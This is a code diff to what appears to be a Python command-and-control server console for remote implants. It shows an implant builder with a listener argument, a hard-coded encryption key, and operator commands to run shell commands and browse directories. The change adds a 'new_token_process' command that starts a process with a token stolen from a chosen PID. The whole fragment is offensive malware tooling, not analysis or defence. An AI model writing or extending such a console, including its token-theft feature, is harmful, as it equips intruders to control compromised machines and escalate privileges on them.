@@ -20,6 +20,8 @@ import os
 conn = redis.StrictRedis(host='localhost', port=6379, db=0)
 key = b'12345678901234567890123456789012'  # A 256 bit (32 byte) key
 
+ROOT_DIR = os.path.dirname(os.path.abspath(__file__))
+
 
 def builder(platform, arch, name, listener):
     if subprocess.Popen(f"./builder {platform} {arch} {name} {listener}", shell=True, stdout=subprocess.PIPE,
@@ -121,13 +123,16 @@ while True:
               'rc       - run a single command \n'
               'rd       - read a directory \n'
               'terminal - Enter a terminal command \n'
-              'dotnet   - Expects the path to the dotnet exe; Example dotnet /home/kali/seatbelt.exe \n'
+              'pid      - returns current PID and parent PID \n'
+              'new_token_process  - Starts a new process with the token of your choice. Expects a PID to steal from and path \n'
               )
         uuid = input('UUID: ')
         # while inp != "exit":  # If the input is exit, break the loop
         choice = input('Command: ')
         choice = choice.lower()
         splits = choice.split()
+        if splits[0] == "new_token_process":
+            cm = splits[0:]
         if splits[0] == "terminal":
             cm = splits[1:]
             cm = ''.join(cm)
